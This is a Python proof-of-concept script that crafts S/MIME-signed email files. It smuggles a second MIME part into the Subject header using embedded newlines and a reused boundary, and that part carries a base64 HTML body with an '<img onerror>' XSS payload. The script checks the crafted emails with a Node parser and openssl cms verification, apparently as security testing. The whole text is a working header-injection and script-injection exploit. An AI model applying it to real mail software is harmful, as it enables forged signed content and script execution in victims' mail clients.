import base64, subprocess, os, re
os.chdir('/tmp/ostest')
B1 = '===============0344718024407626035=='
PWN = '<img src=x onerror="alert(1)">'
b64 = base64.b64encode(PWN.encode()).decode()
signed = open('signed4.eml').read()
m = re.search(r'boundary="([^"]+)"', signed)
B2 = m.group(1)
# signature part text (from the second boundary onwards), keep as-is
sig_start = signed.index('--' + B2)
sig_part = signed[sig_start:]
inner = open('inner4.txt').read()

def build(D, name):
    outer = ('Content-Type: multipart/signed; protocol="application/pkcs7-signature"; micalg="sha-256"; boundary="'
             + B2 + '"\n'
             'MIME-Version: 1.0\n'
             'From: admin@ses\n'
             'To: admin@ses\n'
             'Subject: Re: ' + D + '\n'
             '\n'
             'This is an S/MIME signed message\n'
             '\n'
             '--' + B2 + '\n' + inner + '\n' + sig_part)
    open(name, 'w').write(outer)
    p = subprocess.run(['node', './_z_496_parse.js', './_z_496_emls/' + name],
                       capture_output=True, text=True)
    print('===', name, 'outer parse ===')
    print(p.stdout[:300])
    r = subprocess.run(['openssl', 'cms', '-verify', '-in', name, '-CAfile', 'cert.pem', '-out', name + '.out'],
                       capture_output=True, text=True)
    print('verify rc', r.returncode, r.stderr.strip()[:150])
    if r.returncode == 0:
        subprocess.run(['cp', name + '.out', './_z_496_emls/' + name + '.out'])
        p2 = subprocess.run(['node', './_z_496_parse.js', './_z_496_emls/' + name + '.out'],
                            capture_output=True, text=True)
        print('verified-content parse:', p2.stdout[:300])

D_nl = ('\n--' + B1 + ' \nContent-Type : text/html\nContent-Transfer-Encoding : base64\n\n'
        + b64 + '\n--' + B1 + '-- ')
D_blank = ('\n\n--' + B1 + ' \nContent-Type : text/html\nContent-Transfer-Encoding : base64\n\n'
           + b64 + '\n--' + B1 + '-- ')
build(D_nl, 'vA.eml')
build(D_blank, 'vB.eml')
